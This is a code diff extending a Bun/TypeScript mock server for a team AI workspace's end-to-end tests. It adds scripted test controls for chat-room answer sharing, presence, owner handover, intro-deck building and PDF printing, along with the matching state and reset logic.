@@ -1,16 +1,26 @@
 // A mock team server for the web client's end-to-end tests: the REST API of shared/src/api (every response is
 // checked against the contract schema, every JSON body is validated like the real server does), the WebSocket
 // protocol of ws.ts (hello / seq / resume / reset), and the built web app served by the real serveWeb() of
-// server/src/routes/web.ts (same CSP and cache headers as production).
+// server/src/routes/web-static.ts (same CSP and cache headers as production; /sw.js gets no-op badge calls in front,
+// see withoutWorkerBadge).
 //
 // The AI is scripted by keywords in the message: "artifact", "react", "ask", "error", "slow", "files", "search",
 // "cap-tools" / "cap-time" (the answer pauses at the per-answer limit of tool calls / time: done with stopReason;
 // at the time limit a step still running ends paused), "multi" with "ask" (a question with several answers),
 // "sub-agent" (a sub-task step with its sub-agent's steps under it, Step.parentId), "stop-cut" (a step still running
-// when the person presses Stop ends stopped, Step.stopped);
-// anything else gets a Markdown answer with a table, code, math, a Mermaid diagram and an external image.
+// when the person presses Stop ends stopped, Step.stopped), "wrong-guess" (a read of a file name that does not exist
+// fails, then the AI finds and reads the right file), "save-fails" (the AI's last step, a save, fails);
+// anything else gets a Markdown answer with a table, code, math, a Mermaid diagram and an external image; "long list"
+// gets a list of 400 lines, more than one room message holds (comes in big pieces).
+// "대화방에 보내기" (shareAnswerToRoom): to a room of POST /__test/rooms; like server/src/chat/answer-share.ts, short: a row
+// per linked file (one in a person's own folder or finance/ nobody else in the room opens; one I cannot open is only
+// counted) and, for an answer with recorded sources ("sources"), the provenance line (the room's other members, the
+// folders of those files I may open, more that I cannot), with a confirmKey; sent with that key (POST
+// /__test/share-changed makes the next one stale: asked again) or an older client's confirm = that many people, the linked
+// files asked for go as room files. "share files" answers with a quote in my folder, a shared file and one nobody opens.
+// The rooms answer their own reads (the room, its messages, members, AI, read) from what was sent.
 // Test-only controls: POST /__test/file {path, text | base64} (a team file and its folders), POST /__test/rmdir {path} (a folder gone from disk; its rule rows stay), POST /__test/download-only {path} (a generated, quarantined file: FileEntry.downloadOnly), POST /__test/reset {setup?: boolean, teamLocale?: 'ko'|'en'|'id' (default ko), usersFollowTeam?:
-// boolean (seeded people have no own language), mustChange?: username (signs in with a temporary password)}, POST /__test/drop-ws, POST /__test/server-version, POST /__test/upload-delay {ms} (an upload's answer comes that late, until the next reset),
+// boolean (seeded people have no own language), mustChange?: username (signs in with a temporary password), withAdmin?: boolean (admins dana / 'dana password 1' and eve)}, POST /__test/drop-ws, POST /__test/presence {people: [{id, state}]} (who is online or away: a change to every socket; GET it for the frames the pages sent), POST /__test/server-version, POST /__test/upload-delay {ms} (an upload's answer comes that late, until the next reset), POST /__test/file-rank {ai, delayMs} (팀 파일's AI picks answer that way; GET lists what each pick was sent),
 // POST /__test/revoke {path} (a folder becomes invisible to everyone + access_changed notice), POST /__test/skills
 // {files: [{path, name, description}]} (skill files; skills/임원/ is for admins only),
 // POST /__test/schedule-review (the owner gets a scheduled task nobody confirmed, paused for review; "siteask" with
@@ -18,24 +28,49 @@
 // POST /__test/confidential {all?: boolean} (Safe operations 1A on: every chat confidential; otherwise a chat becomes
 // confidential when a message in it says "confidential"), POST /__test/artifact {type, content} (the next "artifact"
 // answer writes exactly this), POST /__test/connection {…ConnectionStatus fields} (Admin > System > Connection shows
-// them until the next reset), POST /__test/speech-host {…SpeechHost fields} (this server's cores, speed and hosting
-// for "Turn video sound into text", until the next reset), POST /__test/skill-list {…SkillsOverview.aiList} (the Team
-// skills page's "how many skills the AI sees" counts, until the next reset), POST /__test/speech {provider, key?: boolean}
-// (the team's speech provider and whether an OpenRouter key is set), GET-or-POST /__test/transcribe-chats (the chat id
-// each voice input named, null for a new chat; a confidential chat's recording with OpenRouter is refused, 403).
+// them until the next reset), POST /__test/team-address {address: string | null} (GET /api/me team.address, the team's
+// address for its members, until the next reset; none by default), POST /__test/speech-host {…SpeechHost fields} (this server's cores, speed and hosting
+// for "Turn video sound into text", and the tools Voice input lacks, until the next reset), POST /__test/skill-list
+// {…SkillsOverview.aiList} (the Team skills page's "how many skills the AI sees" counts, until the next reset),
+// POST /__test/speech {provider, key?: boolean, chosen?: false}
+// (the team's speech provider and whether an OpenRouter key is set; chosen false: not chosen, read from the key),
+// GET-or-POST /__test/transcribe-chats (the chat id each voice input named, null for a new chat; a confidential chat's
+// recording with OpenRouter is refused, 403), POST
+// /__test/transcribe-progress {message, progress, ms} (the next transcription jobs say that label first, as a server that
+// downloads its speech model does, and end after `ms`; until the next reset).
 // External services: an address on a "down." host fails its check, the key "wrong-key" is refused, the fake MCP server
 // offers two tools at the first check and a third from the next one (one on a "many." host offers 150, of which the
 // first 100 are kept), and a sign-in completes on the second poll.
-// POST /__test/dev-env {box?: 'running', srt?: true} turns the dev environment (experiment) on for every project until the next reset.
+// POST /__test/dev-env {srt?: true, network?: 'offline', sites?: string[]} turns the dev environment (experiment) on until
+// the next reset (sites: the first person's own allowed sites).
+// POST /__test/html-pdf {on: boolean} says whether this server prints HTML to PDF (Me.server.htmlPdf; off by default, as
+// a server without a headless browser) until the next reset; GET /__test/html-pdf lists the pages printed so far.
+// "/intro-deck …" builds the deck like round 2 of docs/DECISIONS.md "D2": an outline, one intro_deck call per slide (the
+// third slide's first try fails and is tried again), the review, then the saved deck, with deck.progress after each and
+// small slide pictures from GET /api/intro-decks/builds/:id/slides/:n; "deck-fail" in the message stops it after three
+// slides. POST /__test/deck-pace {ms, thumbs?: false, tier?: 'standard' | 'deep'} sets the time per step (default 40 ms),
+// whether pictures exist and the budget (the longer ones read the site first: phase "reading"), until the next reset.
+// 팀장 넘기기 (shared/src/api/handover.ts, like server/src/admin/handover.ts): an invite with leadFor (the owner only) is a
+// member in the team group for 72 hours, the open one before it revoked; joining with it makes the owner's card, an
+// Inbox notice and the realtime owner_lead_joined; only the owner revokes a lead invite; the transfer ends the
+// connections in `end` (an id starting with "fail" fails), revokes the open lead invite and clears the flags, tells both
+// people and the other admins in the Inbox and sends owner_changed. Five wrong
+// passwords in a row: 429 rate_limited and the owner's reauth_locked notice. POST /__test/handover {flag?, recovery?,
+// connections?: [{owner, kind, id, label, provider, account}], race?: true (the next transfer answers 409 owner_changed,
+// as when the owner changed meanwhile)} until the next reset; signing in sets lastSeenAt (the ··· menu needs it).
 import { z } from 'zod'
+import type { DriveShare as MockDriveShare, DriveShareFolder as MockDriveFolder } from '@mycel/shared/api'
+import type { KnowledgeGraphStatus, LocalSpeechTool } from '@mycel/shared/api'
+import type { EndedConnection, HandoverConnection, HandoverRecovery, HandoverState, InboxNotification } from '@mycel/shared/api'
 // Keep the server renderer outside the browser TypeScript program; this module runs only in Bun.
 const hwpEngine = import('../../../server/src/files/' + 'hwp-engine.ts').then(m => new m.NativeHwpEngine())
 import {
-  ApiErrorResponse, CSRF_HEADER, TeamGoal, type SkillChange, type SkillManagerGrant, type SkillSuggestion, DEV_SESSION_COOKIE, CHAT_ERROR_MESSAGES, type ChatErrorReason, ERROR_MESSAGES, LOCALE_HEADER, Locale, ServerEvent, UPLOAD_CHUNK_SIZE, WS_PATH, WsClose, isSchema, listEndpoints, uuidv7,
+  AiAllowance, ApiErrorResponse, CSRF_HEADER, Room, RoomMessage, answerFilePaths, answerShareBody, ROOM_FILES_MAX, SMALL_UPLOAD_MAX, TeamGoal, type AnswerShareFile, type AnswerSharePlace, type RoomFile, type SkillChange, type SkillManagerGrant, type SkillSuggestion, DEV_SESSION_COOKIE, CHAT_ERROR_MESSAGES, type ChatErrorReason, ERROR_MESSAGES, LOCALE_HEADER, Locale, PresenceFrame, ServerEvent, UPLOAD_CHUNK_SIZE, WS_PATH, WsClose, isSchema, listEndpoints, uuidv7,
   type ApiName, type Artifact, type Attachment, type SkillInput, type DevEnvRun, type Chat, type Endpoint, type ErrorCode, type FileEntry, type FileVersion, type Folder, type Group, type Invite, type Job, type Me, type Message,
-  MemberEngineChoice, WELCOME_RESULT_SKILL, GENERAL_TASKS_SKILL, GENERAL_BRIEF_SKILL, GENERAL_CARDNEWS_SKILL, CARD_NEWS_ARTIFACT_KEY, GENERAL_PROMO_SKILL, PROMO_ARTIFACT_KEY, PROMO_STYLES, GENERAL_DECK_SKILL, DECK_ARTIFACT_KEY, NOTES_FOLDER, PACK_FOLDERS, BRAND_IMAGES_FOLDER, type TeamLinkStarter, type WelcomeProgress, type Project, type ConnectionStatus, type ServerEventInput, type Step, type TrashItem, type TurnRequest, type UploadSession, type User, type Memory, type Budget, type TeamSettings, type AuditEntry, type Schedule,
+  MemberEngineChoice, CARD_NEWS_ARTIFACT_KEY, PROMO_ARTIFACT_KEY, PROMO_STYLES, DECK_ARTIFACT_KEY, NOTES_FOLDER, BRAND_FOLDER, BRAND_IMAGES_FOLDER, type WelcomeProgress, type Project, type ConnectionStatus, type ServerEventInput, type Step, type TrashItem, type TurnRequest, type UploadSession, type User, type Memory, type Budget, type TeamSettings, type AuditEntry, type Schedule, type DeckBuild,
 } from '@mycel/shared/api'
 import fs from 'node:fs'
+import zlib from 'node:zlib'
 import * as XLSX from 'xlsx'
 import { CCITT_SCAN, JPX_SCAN, makeCidPdf, makeImagePdf, makePagedPdf, makePdf } from '../../../tests/lib/pdf'
 import { serveWeb } from '../../../server/src/routes/web-static'
@@ -54,12 +89,16 @@ import { editPreview, rulesHash } from '../../../server/src/admin/access-edit'
 import os from 'node:os'
 import path from 'node:path'
 import { MockPlugins } from './plugins'
+import { packExample } from '../../../server/src/onboarding/skill-examples'
 
 type Json = Record<string, unknown>
 const sha256Hex = (d: Uint8Array) => new Bun.CryptoHasher('sha256').update(d).digest('hex')
 const parentOf = (p: string) => (p.includes('/') ? p.slice(0, p.lastIndexOf('/')) : '')
 /** like a server whose relay.officialAvailable is off: the official relay is not offered */
 const defaultConnection = (): ConnectionStatus => ({ mode: 'self-relay', address: 'http://acme.localhost:19143', state: 'connecting', detail: null, connectedSince: null, direct: { enabled: false, port: 8443, fingerprintSha256: null }, teamName: 'acme', availableModes: ['self-relay', 'direct-only'] })
+/** A one-page A4 PDF, the stand-in for what the server's headless browser prints (POST /api/files/html-pdf) */
+const MOCK_PDF = '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'
+
 class Fail extends Error {
   constructor(public code: ErrorCode, public status: number, msg?: string, public fields?: Record<string, string>, public params?: Record<string, string | number | boolean>) {
     super(msg ?? ERROR_MESSAGES[code].ko)
@@ -67,8 +106,8 @@ class Fail extends Error {
 }
 /** the Claude sign-in's authorize address (tests/lib/fake-claude-login.ts has the same shape) */
 const MOCK_CLAUDE_AUTHORIZE = 'https://claude.com/cai/oauth/authorize?code=true&client_id=mock&response_type=code&redirect_uri=https%3A%2F%2Fplatform.claude.com%2Foauth%2Fcode%2Fcallback&scope=user%3Ainference&code_challenge=mock&code_challenge_method=S256&state=good-state'
-const fail = (code: ErrorCode, status: number, msg?: string, fields?: Record<string, string>): never => {
-  throw new Fail(code, status, msg, fields)
+const fail = (code: ErrorCode, status: number, msg?: string, fields?: Record<string, string>, params?: Record<string, string | number | boolean>): never => {
+  throw new Fail(code, status, msg, fields, params)
 }
 /** Like server/src/admin/users.ts temporaryFor: a typed temporary password must be ASCII, 8+ and not a common one. */
 function checkTemp(pw: string | undefined): void {
@@ -99,10 +138,44 @@ function auditRows(): AuditEntry[] {
 }
 const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))
 
+/** A slide's small picture for the intro deck being built (PNG, 64 × 36): the cover in the brand colour, the others
+ * light with a title bar, so a tile looks like a slide. */
+const CRC = Array.from({ length: 256 }, (_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c >>> 0 })
+const crc32 = (b: Uint8Array) => { let c = 0xffffffff; for (const x of b) c = CRC[(c ^ x) & 0xff]! ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0 }
+function pngChunk(type: string, data: Uint8Array) {
+  const out = new Uint8Array(12 + data.length), v = new DataView(out.buffer)
+  v.setUint32(0, data.length)
+  out.set(enc.encode(type), 4)
+  out.set(data, 8)
+  v.setUint32(8 + data.length, crc32(out.subarray(4, 8 + data.length)))
+  return out
+}
+function slidePng(i: number): Uint8Array {
+  const w = 64, h = 36
+  const raw = new Uint8Array(h * (w * 3 + 1))
+  const cover = i === 0
+  for (let y = 0; y < h; y++) for (let x = 0; x < w; x++) {
+    const at = y * (w * 3 + 1) + 1 + x * 3
+    const bar = !cover && y >= 5 && y <= 7 && x >= 5 && x <= 34
+    const mark = !cover && y >= 14 && y <= 27 && x >= 8 + (i % 3) * 16 && x <= 20 + (i % 3) * 16
+    const [r, g, b] = cover ? [27 + x, 110 - y, 58 + x] : bar ? [20, 17, 15] : mark ? [27, 110, 58] : [250, 248, 244]
+    raw.set([r, g, b], at)
+  }
+  const ihdr = new Uint8Array(13), v = new DataView(ihdr.buffer)
+  v.setUint32(0, w); v.setUint32(4, h); ihdr.set([8, 2, 0, 0, 0], 8)
+  const parts = [new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]), pngChunk('IHDR', ihdr), pngChunk('IDAT', new Uint8Array(zlib.deflateSync(raw))), pngChunk('IEND', new Uint8Array())]
+  const out = new Uint8Array(parts.reduce((n, x) => n + x.length, 0))
+  let o = 0
+  for (const x of parts) { out.set(x, o); o += x.length }
+  return out
+}
+
 interface FileNode { type: 'file' | 'folder'; data?: Uint8Array; mtime: string; mime?: string }
 interface WsData { user: string; windowId: string; epoch: string | null; after: number | null }
 interface Ctx { user: User; params: Record<string, string>; query: Record<string, string>; body: any; req: Request; file?: File }
 type Handler = (c: Ctx) => unknown | Promise<unknown>
+/** Folders below the mock share account's top level, found by the folder picker's search */
+const DRIVE_SUBFOLDERS = [{ id: 'folder-finance-q3', name: 'Finance Q3', kind: 'folder' as const }, { id: 'folder-contracts', name: 'Contracts', kind: 'folder' as const }]
 
 const enc = new TextEncoder()
 const dec = new TextDecoder()
@@ -118,6 +191,14 @@ const PROMO_TEXT = '---\nname: promo-video\ndescription: 홍보 영상 — 회�
  * first result since docs/DECISIONS.md "D2"; a member who joins with its invite lands on it */
 const DECK_TEXT = '---\nname: intro-deck\ndescription: 회사 소개서 — 회사 소개 자료나 홈페이지에서 읽은 내용으로 팀 브랜드 폴더의 사진과 브랜드 색을 써서 회사 소개서 슬라이드를 만들어요.\nmetadata:\n  title: 회사 소개서\n  inputs: |\n    [{"name": "topic", "label": "주제", "placeholder": "비워 두면 회사 전체"}, {"name": "audience", "label": "누구에게 보낼까요", "placeholder": "예: 제조업 고객사 · 비워 두면 누구에게나"}, {"name": "files", "label": "자료 파일", "placeholder": "비워 두면 팀 브랜드 폴더의 회사 소개", "advanced": true}]\n---\n# 회사 소개서\n'
 
+/** the kept skills (server/src/onboarding/skill-packs.ts CATALOG, short): their titles and one lines in Korean and English */
+const PACK_CATALOG = [
+  { pack: 'general', name: 'intro-deck', visual: true, ko: '회사 소개서', en: 'Company profile', lineKo: '회사 소개로 6~10장짜리 소개서를 만들어요', lineEn: 'Makes a 6–10 slide company profile from the company intro' },
+  { pack: 'general', name: 'card-news', visual: true, ko: '카드뉴스', en: 'Promo cards', lineKo: '회사 소개로 정사각형 카드 5장을 만들어요', lineEn: 'Makes 5 square promo cards from the company intro' },
+  { pack: 'general', name: 'promo-video', visual: true, ko: '홍보 영상', en: 'Promo video', lineKo: '회사 소개로 18초짜리 세로 영상을 만들어요', lineEn: 'Makes an 18-second vertical video from the company intro' },
+  { pack: 'work', name: 'humanizer', visual: false, ko: '자연스러운 글', en: 'Natural writing', lineKo: 'AI가 쓴 티가 나는 글을 사람이 쓴 것처럼 다듬어요', lineEn: 'Rewrites text that reads as AI-written so a person seems to have written it' },
+] as const
+
 /** like server/src/admin/settings.ts LOCALE_CHANGED */
 const LOCALE_CHANGED = { type: 'notice', data: { level: 'info', code: 'locale_changed', message: '' } } as const
 /** like server/src/admin/settings.ts BROWSER_POLICY_CHANGED */
@@ -132,6 +213,11 @@ export class MockServer {
   seq = 0
   buffer: { seq: number; text: string }[] = []
   sockets = new Set<Bun.ServerWebSocket<WsData>>()
+  /** who is online or away (docs/DECISIONS.md "접속 상태"), as POST /__test/presence sets it; the whole list goes to
+   * each socket after its hello, changes to every socket */
+  presence = new Map<string, 'online' | 'away'>()
+  /** the `presence` frames the pages sent (their own window's state), oldest first; GET /__test/presence reads them */
+  presenceSent: { user: string; windowId: string; state: string }[] = []
   sessions = new Map<string, string>() // token -> user id
   /** people whose latest sign-in used a temporary password (Me.session.tempLogin while they must change it) */
   tempLogins = new Set<string>()
@@ -140,14 +226,55 @@ export class MockServer {
   /** last password reset by an admin, per user id (Me.passwordReset) */
   resets = new Map<string, NonNullable<Me['passwordReset']>>()
   groups: Group[] = []
-  invites: (Invite & { token: string })[] = []
+  invites: (Invite & { token: string; leadBy?: string })[] = []
+  /** 팀장 넘기기: whether the flag is offered, who can reset passwords, the owners' own connections, the card */
+  handover = MockServer.handoverDefault()
+  static handoverDefault() {
+    return {
+      flag: true,
+      recovery: 'server' as HandoverRecovery | null,
+      connections: [
+        { owner: 'olga', kind: 'team_ai', id: 'cred-claude', label: '회사 Claude', provider: 'claude', account: 'o***@acme.example' },
+        { owner: 'olga', kind: 'drive_share', id: 'share-acme', label: 'Acme 드라이브', provider: 'google', account: null },
+      ] as (HandoverConnection & { owner: string })[],
+      card: null as { inviteId: string; leadFor: string; userId: string; joinedAt: string; dismissed: boolean; by: string } | null,
+      race: false,
+      wrong: 0,
+    }
+  }
+  /** the Inbox's handover notices (GET /api/notifications): what is shown is worked out when they are read */
+  inbox: ({ id: string; userId: string; createdAt: string; readAt: string | null } & (
+    | { kind: 'lead_joined'; inviteId: string; leadFor: string; joinerId: string; joinedAt: string }
+    | { kind: 'transferred'; me: 'from' | 'to' | 'other'; fromId: string; toId: string; fromName: string; toName: string; ended: { teamAi: number; driveShares: number; failed: number } }
+    | { kind: 'reauth_locked' }
+  ))[] = []
   /** the team invite link (shared/src/api/team-links.ts): one open at a time; replaced and revoked tokens say "revoked" */
-  teamLink: { id: string; token: string; groupIds: string[]; skillPath: string | null; starter: TeamLinkStarter | null; maxUses: number; uses: number; createdBy: { id: string; name: string }; createdAt: string; expiresAt: string } | null = null
+  teamLink: { id: string; token: string; groupIds: string[]; skillPath: string | null; maxUses: number; uses: number; createdBy: { id: string; name: string }; createdAt: string; expiresAt: string } | null = null
   revokedTeamLinks = new Set<string>()
   /** the welcome steps' progress (server/src/onboarding/welcome.ts) */
   welcome: WelcomeProgress | null = null
+  /** a saved welcome row: finished once 회사 소개 is answered (saved or put off) and 내 스킬, 팀 파일, 도구 연결 and the
+   * invite are each done or put off, not while 내 스킬 waits for a computer (server/src/onboarding/welcome.ts
+   * welcomeFinished, docs/DECISIONS.md "W6") */
+  welcomeSaved(p: WelcomeProgress, at: string): WelcomeProgress {
+    const st = p.steps
+    if (!p.finishedAt && st.profile && st.skills && st.files && st.tools && st.invite && !p.skillsLater) p.finishedAt = at
+    p.updatedAt = at
+    return p
+  }
   /** the saved company profile, and the website readings (server/src/onboarding/draft.ts, short: no chat of the list) */
   companyProfile: import('@mycel/shared/api').CompanyProfile | null = null
+  /** the kept skills' catalog (server/src/onboarding/skill-packs.ts, docs/DECISIONS.md "W6"): the examples are the
+   * server's own (skill-examples.ts: the web build's pictures, the EXAMPLE.md texts) unless a test sets one by name
+   * (/__test/pack-examples; null: none, the viewer's "예시를 준비하고 있어요"), the catalog read failing
+   * (/__test/packs-fail), the next installs failing (/__test/pack-install-fail: that many requests), and share checks
+   * held until stop-check (/__test/share-hold) */
+  packExamples: Partial<Record<string, import('@mycel/shared/api').PackExample | null>> = {}
+  packsFail = false
+  /** POST /__test/prepared-fail: GET /api/skills/examples fails (Home's "다시 불러오기") */
+  preparedFail = false
+  packInstallFails = 0
+  shareHold = false
   profileDrafts = new Map<string, { userId: string; website: string; reads: number }>()
   /** the suggestion under answers a test set, and the ones closed */
   resultSuggestion: import('@mycel/shared/api').ResultSuggestion | null = null
@@ -158,16 +285,38 @@ export class MockServer {
   skillMakers = new Map<string, string>()
   folders: Folder[] = []
   chats: Chat[] = []
+  /** the team chat rooms the signed-in person is in (empty unless a test sets them: /__test/rooms) */
+  rooms: Room[] = []
+  /** the messages of those rooms: only what was sent to them here ("대화방에 보내기"), oldest first */
+  roomMessages = new Map<string, RoomMessage[]>()
+  /** a shared answer's clientMessageId → its room message (the same id sent again gets it back) */
+  sharedByClientId = new Map<string, RoomMessage>()
+  /** POST /__test/share-changed: a "confirm" key given before this is stale (something changed meanwhile) */
+  shareEpoch = 0
   messages: Message[] = []
   artifacts: Artifact[] = []
+  /** intro decks built in round 2 (newest last) and the time per build step (POST /__test/deck-pace) */
+  deckBuilds: DeckBuild[] = []
+  deckPaceMs = 40
+  deckThumbs = true
+  deckTier: DeckBuild['tier'] = 'quick'
   projects: Project[] = []
   memories: Memory[] = []
+  /** Settings › 트리나에게 허용한 것 (POST /__test/ai-allowances sets them; one person's, like memories) */
+  aiAllowances: AiAllowance[] = []
   /** Settings › Scheduled tasks (POST /__test/schedule-review adds one nobody confirmed: needsReview) */
   schedules: (Schedule & { userId: string })[] = []
+  /** Settings › Notifications (one person's, like the rest of this mock's per-person state) */
+  notifyPrefs = MockServer.notifyPrefsDefault()
+  static notifyPrefsDefault() {
+    return { scheduleSuccess: true, scheduleFailure: true, connectionReconnect: true, skillSuggestions: true, roomMessages: true, roomLevel: 'direct' as 'direct' | 'all' | 'none', roomThreadReplies: true, messagePreview: true, quietHours: { on: false, start: '22:00', end: '08:00', weekends: false } }
+  }
   budgets: Budget[] = []
   files = new Map<string, FileNode>()
   versions: FileVersion[] = []
   connection: ConnectionStatus = defaultConnection()
+  /** GET /api/me team.address (server/src/system/connection.ts teamAddressOf): none unless POST /__test/team-address */
+  teamAddress: string | null = null
   trash: (TrashItem & { node: FileNode })[] = []
   uploads = new Map<string, UploadSession & { chunks: Map<number, Uint8Array> }>()
   attachments = new Map<string, Attachment & { data: Uint8Array }>()
@@ -179,22 +328,31 @@ export class MockServer {
   queuePositions = new Map<string, number>()
   queueRevision = 0
   settings: TeamSettings = defaultSettings()
-  /** the team logo (Admin > Team settings): served by the real serveWeb() at /team-icon, /favicon.ico, the manifest */
+  /** the team logo (Admin > Team settings): served by the real serveWeb() at /team-icon (the sidebar header); the tab
+   * and app icons stay the product's */
   teamIcon: TeamIconFile | null = null
+  /** Admin › Team settings › Knowledge graph (server/src/knowledge-graph/): made-up folders; POST /__test/knowledge-graph
+   * {available?: boolean} says whether CodeGraph is "installed" */
+  kg: KnowledgeGraphStatus = mockKnowledgeGraph(true)
   speechKey: { set: boolean; hint: string | null; updatedAt: string | null } = { set: false, hint: null, updatedAt: null }
+  /** an admin chose the speech provider (stored); false: like server/src/admin/settings.ts, it reads OpenRouter while the
+   * team's key is set and off without it (speechNow) */
+  speechChosen = true
   /** the chat id each voice input named (null: a new chat) */
   transcribeChats: (string | null)[] = []
-  /** GET /api/admin/speech-host: a 4-core self-installed server that has not measured its speed yet */
-  speechHost = { cpuCores: 4, localPieceSec: 30, localSecPerSec: null as number | null, hostedNewSec: null as number | null }
+  /** transcription jobs report this label first and end after `ms` (POST /__test/transcribe-progress) */
+  transcribeProgress: { message: string; progress: number | null; ms: number } | null = null
+  /** GET /api/admin/speech-host: a 4-core self-installed server that has not measured its speed yet, with whisper.cpp and
+   * ffmpeg (localMissing: the tools 'local' lacks) */
+  speechHost = { cpuCores: 4, localPieceSec: 30, localSecPerSec: null as number | null, hostedNewSec: null as number | null, localMissing: [] as LocalSpeechTool[] }
   /** every request the client made (method + path), for assertions */
   log: string[] = []
-  /** team skills: "팀 스킬 관리" grants (also kept as folder rules on this.folders), suggestions, changes under skills/ */
-  skillManagers: SkillManagerGrant[] = []
+  /** team skills: suggestions, changes under skills/ (who manages them is the folder rules: skillGrants) */
   suggestions: SkillSuggestion[] = []
   skillChanges: SkillChange[] = []
   /** engine / model named in chat requests (tests check people who may not pick never send one) */
   engineRequests: { name: string; user: string; engine?: unknown; model?: unknown }[] = []
-  /** Admin > AI engines: "팀원이 엔진 고르기 허용" and the Claude-limit fallback (like the server: off by default) */
+  /** Admin > AI engines: "팀원이 엔진 고르기 허용" and "다른 AI로 대신 답하기" (like a self-hosted server: off by default) */
   memberChoice: MemberEngineChoice = { mode: 'off', groupIds: [], userIds: [] }
   limitFallback = false
   codexEnabled = true
@@ -202,6 +360,12 @@ export class MockServer {
   apiEngineEnabled = false
   /** Google Drive's client on this test server: none (like a server not set up for it), or set up in Admin › App connectors */
   driveClient: 'none' | 'app' = 'none'
+  /** Admin › Connectors › Google Drive: "Members can connect their own Google Drive" (off for a new team, like the server) */
+  driveMembers = false
+  /** Drives shared with the team (server/src/integrations/google-drive/shares.ts); never a token here either */
+  driveShares: MockDriveShare[] = []
+  /** a share sign-in under way: its flow id, and which share it signs in again for */
+  driveShareFlow: { id: string; shareId: string | null; polls: number } | null = null
   /** Admin > AI connections: the team's connections (secrets are opened with the real server sealing code and dropped) */
   credentials: Credential[] = []
   credMemberOwn = true
@@ -226,11 +390,13 @@ export class MockServer {
   teamGoal: TeamGoal | null = null
   /** Home's frequent skills (GET /api/skills/popular): none unless /__test/popular-skills names some by path */
   popular: { path: string; uses: number; users: number }[] = []
-  /** POST /__test/dev-env {box?: 'running'}: the dev environment (experiment) of every project is on until the next
-   * reset, with a stopped box (or a running one) and a few lines of activity; srt: true is the srt runner (no box, a
-   * running dev server and a waiting job, warning version 2); otherwise its endpoints answer 404, like
-   * a server without MYCEL_DEV_ENV */
-  devEnv: { box: 'stopped' | 'running'; srt?: { running: DevEnvRun[]; waiting: DevEnvRun[] } } | null = null
+  /** POST /__test/dev-env: the dev environment (experiment) is on until the next reset (Me.server.devEnv, Team settings
+   * › Dev environment); srt: true is the srt runner (warning version 2, the queue of the chat's runs); otherwise its
+   * endpoints answer 404, like a server without MYCEL_DEV_ENV */
+  devEnv: { srt?: { running: DevEnvRun[]; waiting: DevEnvRun[] } } | null = null
+  /** POST /__test/html-pdf: the server prints HTML to PDF ("PDF로 저장" in an .html preview); the pages printed, with how */
+  htmlPdf = false
+  htmlPdfCalls: { path: string; how: 'save' | 'download' }[] = []
   /** the team setting devEnv.team (GET and PUT /api/admin/dev-env), off until an admin turns it on */
   devEnvTeam = MockServer.devEnvTeamDefault()
   static devEnvTeamDefault() {
@@ -266,10 +432,19 @@ export class MockServer {
   /** POST /__test/upload-delay: the bytes of an upload are in, the answer takes this long (a server that is finishing) */
   uploadDelayMs = 0
   private uploadAnswer = () => new Promise<void>((done) => setTimeout(done, this.uploadDelayMs))
+  /** 팀 파일's AI picks (server/src/onboarding/file-rank.ts, short): by words in the names; POST /__test/file-rank
+   * {ai: 'none' | 'failed' | 'timeout', delayMs} answers otherwise until the next reset; GET /__test/file-rank lists
+   * the entries each pick was sent (names and metadata only) */
+  fileRank: { ai: 'done' | 'none' | 'failed' | 'timeout'; delayMs: number } = { ai: 'done', delayMs: 0 }
+  fileRankCalls: { entries: unknown[] }[] = []
 
-  reset(o: { setup?: boolean; teamLocale?: Locale; usersFollowTeam?: boolean; mustChange?: string } = {}) {
+  reset(o: { setup?: boolean; teamLocale?: Locale; usersFollowTeam?: boolean; mustChange?: string; withAdmin?: boolean } = {}) {
     this.generation++
+    this.presence = new Map()
+    this.presenceSent = []
     this.uploadDelayMs = 0
+    this.fileRank = { ai: 'done', delayMs: 0 }
+    this.fileRankCalls = []
     this.setupNeeded = !!o.setup
     this.usersFollowTeam = !!o.usersFollowTeam
     this.serverVersion = '0.1.0'
@@ -278,7 +453,10 @@ export class MockServer {
     this.teamGoal = null
     this.popular = []
     this.devEnv = null
+    this.htmlPdf = false
+    this.htmlPdfCalls = []
     this.devEnvTeam = MockServer.devEnvTeamDefault()
+    this.notifyPrefs = MockServer.notifyPrefsDefault()
     this.devEnvSites = new Map()
     this.epoch = uuidv7()
     this.seq = 0
@@ -291,23 +469,39 @@ export class MockServer {
     this.users = []
     this.groups = []
     this.invites = []
+    this.handover = MockServer.handoverDefault()
+    this.inbox = []
     this.teamLink = null
     this.revokedTeamLinks.clear()
     this.welcome = null
     this.companyProfile = null
+    this.packExamples = {}
+    this.packsFail = false
+    this.preparedFail = false
+    this.packInstallFails = 0
+    this.shareHold = false
     this.profileDrafts = new Map()
     this.resultSuggestion = null
     this.closedSuggestions = new Set()
     this.skillDrafts = new Map()
     this.skillMakers = new Map()
     this.chats = []
+    this.rooms = []
+    this.roomMessages = new Map()
+    this.sharedByClientId = new Map()
+    this.shareEpoch = 0
     this.sources.clear()
     this.messages = []
     this.artifacts = []
+    this.deckBuilds = []
+    this.deckPaceMs = 40
+    this.deckThumbs = true
+    this.deckTier = 'quick'
     this.allConfidential = false
     this.nextArtifact = null
     this.projects = []
     this.memories = []
+    this.aiAllowances = []
     this.schedules = []
     this.budgets = []
     this.versions = []
@@ -318,7 +512,6 @@ export class MockServer {
     this.files.clear()
     this.log = []
     this.engineRequests = []
-    this.skillManagers = []
     this.suggestions = []
     this.skillChanges = []
     this.memberChoice = { mode: 'off', groupIds: [], userIds: [] }
@@ -326,6 +519,9 @@ export class MockServer {
     this.codexEnabled = true
     this.apiEngineEnabled = false
     this.driveClient = 'none'
+    this.driveMembers = false
+    this.driveShares = []
+    this.driveShareFlow = null
     this.credentials = []
     this.credMemberOwn = true
     this.credSharedSubscriptions = false
@@ -339,9 +535,12 @@ export class MockServer {
     this.integrationTemplates = []
     this.settings = defaultSettings()
     this.teamIcon = null
+    this.kg = mockKnowledgeGraph(true)
